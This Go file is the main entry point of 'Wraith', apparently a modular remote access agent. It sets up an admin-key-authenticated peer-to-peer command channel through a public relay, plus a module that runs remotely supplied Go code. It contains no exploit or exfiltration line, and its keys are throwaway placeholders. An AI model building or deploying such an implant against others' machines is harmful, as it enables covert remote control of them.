package main

import (
	"context"
	"crypto/ed25519"
	"os"
	"os/signal"
	"syscall"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
	"dev.l1qu1d.net/wraith-labs/wraith/wraith/stdmod"

	// This is here temporarily while I work on the modules which use these
	// TODO
	_ "github.com/pascaldekloe/jwt"
	_ "github.com/traefik/yaegi/interp"
	_ "github.com/traefik/yaegi/stdlib"
)

const RESPECT_EXIT_SIGNALS = true

var exitTrigger chan struct{}

func setupCloseHandler(triggerChannel chan struct{}) {
	c := make(chan os.Signal, 2)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	if RESPECT_EXIT_SIGNALS {
		go func() {
			for range c {
				triggerChannel <- struct{}{}
			}
		}()
	}
}

func init() {
	exitTrigger = make(chan struct{})
	setupCloseHandler(exitTrigger)
}

func main() {
	// Create Wraith
	w := libwraith.Wraith{}

	// Create context for Wraith
	ctx, ctxCancel := context.WithCancel(context.Background())

	// Prepare some config values
	_, ownPrivKey, _ := ed25519.GenerateKey(nil)
	adminPubKey, _, _ := ed25519.GenerateKey(nil)

	// Start Wraith in goroutine
	go w.Spawn(
		ctx,
		libwraith.Config{
			StrainId:                   "none",
			FingerprintGenerator:       func() string { return "none" },
			HeartbeatTimeout:           1 * time.Second,
			ModuleCrashloopDetectCount: 3,
			ModuleCrashloopDetectTime:  30 * time.Second,
		},
		&stdmod.PineconeJWTCommsManagerModule{
			OwnPrivKey:   ownPrivKey,
			AdminPubKey:  adminPubKey,
			ListenTcp:    true,
			ListenWs:     true,
			UseMulticast: true,
			StaticPeers: []string{
				"wss://pinecone.matrix.org/public",
			},
		},
		&stdmod.ExecGoModule{},
	)

	// Wait until the exit trigger fires
	<-exitTrigger

	// Kill Wraith and exit
	ctxCancel()
	time.Sleep(1 * time.Second) // wait to make sure everything has cleaned itself up
}
